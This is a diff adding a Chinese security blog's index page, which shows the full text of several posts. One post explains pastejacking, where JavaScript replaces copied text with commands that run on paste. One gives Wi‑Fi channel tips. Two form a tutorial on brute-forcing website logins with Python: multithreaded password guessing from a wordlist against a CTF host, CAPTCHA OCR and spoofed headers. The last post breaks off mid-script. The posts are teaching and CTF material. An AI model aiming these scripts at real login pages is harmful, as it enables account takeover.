@@ -258,6 +258,753 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/14/Pastejacking粘贴劫持/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/10/14/Pastejacking粘贴劫持/" itemprop="url">
+                  Pastejacking粘贴劫持
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-14T15:22:21+08:00">
+                2017-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/10/14/Pastejacking粘贴劫持/" class="leancloud_visitors" data-flag-title="Pastejacking粘贴劫持">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Pastejacking粘贴劫持"><a href="#Pastejacking粘贴劫持" class="headerlink" title="Pastejacking粘贴劫持"></a>Pastejacking粘贴劫持</h1><p>这是一个网站的演示，诱使用户复制无辜的命令 <a href="https://security.love/Pastejacking" target="_blank" rel="noopener">https://security.love/Pastejacking</a>  </p>
+<p>在用户浏览网页，需要复制网页上内容的时候，通过js来劫持ctrl+c或者右键复制，替换剪切板的内容。配合网页内容的特殊性和对特定用户一定程度的了解，可以达到诱导他做一些事情的目的。  </p>
+<p>github地址:  <a href="https://github.com/dxa4481/Pastejacking" target="_blank" rel="noopener">https://github.com/dxa4481/Pastejacking</a>    </p>
+<p>上面网站的演示中只是将剪贴板内容换成了显示“evil”这种无害命令，下来我们更改一下他的代码。 下图是他替换部分的代码。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/1.png" alt="">  </p>
+<p>在网页显示的部分我们自己改成目标可能会复制的东西，尤其对方可能会复制下来在cmd或者terminal中运行的东西，但是网页这部分看起来肯定是正常无害的。这里是稍作更改的用户能看到的界面，然后用户在这里复制。  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/2.png" alt=""><br>然后在源码的这里，把括号中的内容换成调用一个有威胁的程序或者某些恶作剧命令，这里演示一下。<br><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/5.png" alt=""><br>这里改成关机的指令或者画图的指令，然后在页面随便复制什么东西，都会被替换成这个指令，到cmd中看看效果，因为有/n的存在，粘贴时直接就被执行了。  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/3.png" alt=""><br><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/4.png" alt=""><br>如果将这里的命令设置成一些危险的指令，后果十分严重，所以在访问看起来并不安全的网站的时候，要仔细检查剪贴板有没有被替换。最好的办法是用firefox中NoScript等工具在禁用js的情况下访问这类网站。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/29/通过改变wifi信道来改善信号/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/09/29/通过改变wifi信道来改善信号/" itemprop="url">
+                  通过改变wifi信道来改善信号
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-29T16:50:09+08:00">
+                2017-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/无线网络/" itemprop="url" rel="index">
+                    <span itemprop="name">无线网络</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/09/29/通过改变wifi信道来改善信号/" class="leancloud_visitors" data-flag-title="通过改变wifi信道来改善信号">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="通过改变wifi信道改善信号"><a href="#通过改变wifi信道改善信号" class="headerlink" title="通过改变wifi信道改善信号"></a>通过改变wifi信道改善信号</h1><p>在路由器越来越多的今天，我们经常会发现自己的wifi信号和邻居的冲突而导致速度变慢，本文讲解下发生冲突的原因和一些改善策略。  </p>
+<h2 id="0x00-常见wifi信道冲突的原因"><a href="#0x00-常见wifi信道冲突的原因" class="headerlink" title="0x00 常见wifi信道冲突的原因"></a>0x00 常见wifi信道冲突的原因</h2><p>目前主流的2.4Ghz无线WIFI网络设备不管是802.11b/g还是802.11b/g/n 一般都支持13个信道。它们的中心频率虽然不同，但是因为都占据一定的频率范围，所以会有一些相互重叠的情况。当路由器十分密集时，wifi信号之间互相干扰，上网体验会非常差。<br><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/1.jpg" alt=""><br>如图所示，相差五个信道以上就几乎不存在干涉，但相邻的信道重叠部分很大。<br>像博主这样在大学宿舍住的，一个宿舍一般都好几个路由器，再加上隔壁宿舍，楼上楼下以及学校提供的一些大功率热点，干扰会十分大。</p>
+<h2 id="0x01-通过wifi分析类软件分析wifi信号"><a href="#0x01-通过wifi分析类软件分析wifi信号" class="headerlink" title="0x01 通过wifi分析类软件分析wifi信号"></a>0x01 通过wifi分析类软件分析wifi信号</h2><p>那怎么查看附近的热点信道呢？这里我们可以用到各种wifi分析软件，比如inSSIDer，KillerPerformanceSuite，netstumbler等，我在这里使用了体积最小的inSSIDer，查看了宿舍的wifi分布情况。<br>这里需要先选择无线网卡，不管是外置的还是笔记本内置的，必须选择无线网卡才能扫描。  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/2.png" alt="">  </p>
+<h2 id="0x02-设置合适的wifi信道"><a href="#0x02-设置合适的wifi信道" class="headerlink" title="0x02 设置合适的wifi信道"></a>0x02 设置合适的wifi信道</h2><p><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/3.png" alt="">  </p>
+<p>由图可以看出，大学宿舍的wifi分布是很密集的，所以我选择了最靠边的13信道减少冲突。<br>在平时的小区内部，路由器会相对少很多，这个时候只要避开几个邻居的信道，就可以大大减少冲突。  </p>
+<h2 id="0x03-设置合适的频带宽度"><a href="#0x03-设置合适的频带宽度" class="headerlink" title="0x03 设置合适的频带宽度"></a>0x03 设置合适的频带宽度</h2><p>常见的路由器可设置的频带宽度为20Mhz和40Mhz，显而易见，40Mhz肯定比20Mhz传输道路宽，所以传输速度快。但是在路由器密集的地方，频带宽度大也就意味着容易和别人的信号起冲突。<br>就像公路的总宽度是一定的，如果没有冲突，用更宽的卡车（40Mhz）明显运送货物（数据）更快，但是车多了，容易拥堵，大家还都用卡车的话，肯定是不如都开小汽车（20Mhz）来的快。<br>所以我对频带宽度选择的建议是，如果在路由器稀疏的地方，就用40Mhz，在路由器密集的地方，就用20Mhz。  </p>
+<h2 id="0x04-使用5-0Ghz频段（附）"><a href="#0x04-使用5-0Ghz频段（附）" class="headerlink" title="0x04 使用5.0Ghz频段（附）"></a>0x04 使用5.0Ghz频段（附）</h2><p>5Ghz信号的波长要比2.4Ghz信号的要短，而波长越短的电磁波穿透力就越强。但因为频率越高消耗在穿透上的能量越大，导致信号浪费，设备接受到的反而是反射衍射过来的信号。2.4Ghz下，衍射和反射比5Ghz要多，因此设备接受到的信号反而强。<br>但是5Ghz比2.4Ghz要多出很多空闲的高频段，可以分为23个不重叠的20MHz频段。而且因为目前大部分用户的路由器都工作在2.4Ghz，所以5Ghz是一个很好的选择。<br>这里要注意的一点是，配置5Ghz需要路由器和接收设备的无线网卡都支持5Ghz，否则买到5Ghz的路由器之后，电脑或者手机无法接收也是没有用的。下面教大家几个查看自己电脑是否支持5.0Ghz的方法：  </p>
+<ul>
+<li>1 在设备管理器中查看自己的无线网卡型号，然后去网上搜是否支持5Ghz。</li>
+<li>2 在网络属性的硬件属性中查看频段。</li>
+<li>3 在cmd中输入netsh wlan show drivers，然后查看其中的支持的无线电类型，如果包含802.11a或802.11ac，则支持5Ghz。如博主的网卡，就不支持5Ghz。  </li>
+</ul>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/4.png" alt="">   </p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/01/python爬虫暴力破解网站登陆密码（二）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/09/01/python爬虫暴力破解网站登陆密码（二）/" itemprop="url">
+                  python爬虫暴力破解网站登陆密码（二）
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-01T19:32:43+08:00">
+                2017-09-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/09/01/python爬虫暴力破解网站登陆密码（二）/" class="leancloud_visitors" data-flag-title="python爬虫暴力破解网站登陆密码（二）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="python爬虫暴力破解网站登陆密码（二）"><a href="#python爬虫暴力破解网站登陆密码（二）" class="headerlink" title="python爬虫暴力破解网站登陆密码（二）"></a>python爬虫暴力破解网站登陆密码（二）</h1><p>上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  </p>
+<h2 id="0x00-处理验证码"><a href="#0x00-处理验证码" class="headerlink" title="0x00 处理验证码"></a>0x00 处理验证码</h2><p>网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。可是当某些网站的验证码比较清晰好识别的时候，我们就可以借助计算机光学识别实现了。对于复杂的验证码，可以使用一些验证码处理的api（绝大多数是付费的）这些接口会有人工处理，一般30秒之内就能返回结果。    </p>
+<p>光学识别示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Tkinter import *</span><br><span class="line">tk= Tk()</span><br><span class="line">import pytesseract</span><br><span class="line">from PIL import Image</span><br><span class="line">x=1</span><br><span class="line">for i in range(5):</span><br><span class="line">    img = Image.open(&quot;%s.png&quot; %x)</span><br><span class="line">    gray = img.convert(&apos;L&apos;)</span><br><span class="line">    gray.save(&apos;%s_1.png&apos; %x)</span><br><span class="line">    bw = gray.point(lambda x: 0 if x &lt; 200 else 255,&apos;1&apos;)</span><br><span class="line">    bw.save(&apos;%s_2.png&apos; %x)</span><br><span class="line">    img.show()</span><br><span class="line">    print(pytesseract.image_to_string(bw))</span><br><span class="line">    x+=1</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-多线程、多进程"><a href="#0x01-多线程、多进程" class="headerlink" title="0x01 多线程、多进程"></a>0x01 多线程、多进程</h2><p>在暴力破解中需要的时间本就十分漫长，如果字典过大仍然使用串行处理，时间会长到一个不可思议的程度，为了尽量减少花费的时间，我们采用多线程或者多进程并行处理的方式提升处理速度。这里我们采用多线程作为例子，因为python实现多线程十分方便。  </p>
+<p>多线程原理：<br>同一时间内，CPU只能处理1条线程，只有1条线程在工作（执行）;多线程并发（同时）执行，其实是CPU快速地在多条线程之间调度（切换）。如果CPU调度线程的时间足够快，就造成了多线程并发执行的假象。  </p>
+<p>多线程优缺点：  </p>
+<ul>
+<li>优点：大大提高运行效率。</li>
+<li>缺点：开启线程需要占用一定的内存空间（默认情况下，主线程占用1M，子线程占用512KB），如果开启大量的线程，会占用大量的内存空间，降低程序的性能；线程越多，CPU在调度线程上的开销就越大。  </li>
+</ul>
+<p>多线程示例：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">def boom():</span><br><span class="line">    data = &#123;&apos;pwd&apos;:password&#125;</span><br><span class="line">    print password</span><br><span class="line">    content = requests.post(url,data=data)</span><br><span class="line">    content.encoding=&apos;utf-8&apos;</span><br><span class="line">    html=content.text</span><br><span class="line">    if html != recv:</span><br><span class="line">        print html</span><br><span class="line">#dname = input(&quot;input dname:&quot;)</span><br><span class="line">url=&apos;http://120.24.86.145:8002/baopo/?yes&apos;</span><br><span class="line">data = &#123;&apos;pwd&apos;:123&#125;</span><br><span class="line"></span><br><span class="line">content = requests.post(url,data=data)</span><br><span class="line">content.encoding=&apos;utf-8&apos;</span><br><span class="line">recv=content.text</span><br><span class="line"></span><br><span class="line">passFile = open(r&apos;C:\Users\Leticia\Desktop\mutou.txt&apos;)</span><br><span class="line"></span><br><span class="line">for line in passFile.readlines():</span><br><span class="line">    password = line.strip(&apos;\n&apos;)</span><br><span class="line">    t = Thread(target=boom)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/26/python爬虫暴力破解网站登陆密码（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" itemprop="url">
+                  python爬虫暴力破解网站登陆密码（一）
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-26T22:00:01+08:00">
+                2017-06-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" class="leancloud_visitors" data-flag-title="python爬虫暴力破解网站登陆密码（一）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="python爬虫暴力破解网站登陆密码（一）"><a href="#python爬虫暴力破解网站登陆密码（一）" class="headerlink" title="python爬虫暴力破解网站登陆密码（一）"></a>python爬虫暴力破解网站登陆密码（一）</h1><p>本来准备一次写完这篇博客，但是写出主干后发现有很多重要的东西没有提到，所以就分成两篇写，这篇写基础操作，下一篇加上验证码处理和多线程处理模块。  </p>
+<h2 id="0x00-robot-txt"><a href="#0x00-robot-txt" class="headerlink" title="0x00 robot.txt"></a>0x00 robot.txt</h2><p>在写爬虫爬取某个网站之前，我们应该去了解这个网站的robot.txt。那什么是robot.txt呢？简单的说，就是网站的所有者为了让爬虫了解爬取该网站的时候存在哪些限制。虽然这些限制只是建议，但是如果你的爬虫不遵守这些限制，很容易会被网站所封禁。<br>下图为IBM官方网站的robot.txt，我们写爬虫的时候，应该尽量遵守规定。<br><img src="http://oo3iot5oz.bkt.clouddn.com/python/a.png" alt="">  </p>
+<p>  下面给出几种写法示例：  </p>
+<ol>
+<li><p>允许所有的robot访问  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Allow: / </span><br><span class="line">或者</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>禁止所有搜索引擎访问网站的任何部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>仅禁止Baiduspider访问您的网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>仅允许Baiduspider访问您的网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>禁止spider访问特定目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /tmp/</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="0x01-伪造header"><a href="#0x01-伪造header" class="headerlink" title="0x01 伪造header"></a>0x01 伪造header</h2><p>网站防采集的前提就是要正确地区分人类访问用户和网络机器人，方法之一就是查看你的http请求头，我们为了让自己的爬虫看起来更像是人类用户，就需要对header进行伪造。<br>伪造header成什么样最好呢？当然是伪造成自己手动访问时候的样子最好。这里我们就能用到Firefox中的一个扩展工具——HttpFox（也可以用Chrome开发者模式直接查看），利用这个工具，我们能抓取我们用Firefox访问网站过程的数据包，然后查看这个数据包，就可以看到我们手动访问时的header，然后使用python的requests库进行伪造。<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/python/b.png" alt="">  </p>
+<p>  代码中hea的部分就可以照着上图写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-填写data并登陆"><a href="#0x02-填写data并登陆" class="headerlink" title="0x02 填写data并登陆"></a>0x02 填写data并登陆</h2><p>既然要破解登陆密码，那前提肯定要做到登陆，我们手动登陆的时候当然是输入账号，输入密码，然后点击提交。可是爬虫工作时，看到的和我们不一样，这个时候账号密码应该怎么传入、登陆操作该怎么进行呢？这个时候再一次用到了Httpfox（同样可以用Chrome开发者模式直接查看），上次我们手动输入时，传入的数据在Httpfox中也被抓取了，照着他的样子填好data，然后我们使用requests中的post命令传入data获取一个cookie，然后再通过cookies访问下一个网站，就实现了爬虫的登陆。<br><img src="http://oo3iot5oz.bkt.clouddn.com/python/c.png" alt="">  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/d.png" alt="">  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/e.png" alt=""><br>如这个网站，两种方法都可以看到要传递的数据，那么填写的时候就要写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'j_username'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'j_password'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'checkCode'</span>: <span class="string">'xxx'</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>这里用一个ctf环境先做一个小脚本进行测试，这道题密码是五位纯数字，生成字典的方法之前破解压缩包的时候已经讲过不在赘述，代码如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/baopo/?yes'</span></span><br><span class="line">data = &#123;<span class="string">'pwd'</span>:<span class="number">123</span>&#125;</span><br><span class="line"></span><br><span class="line">content = 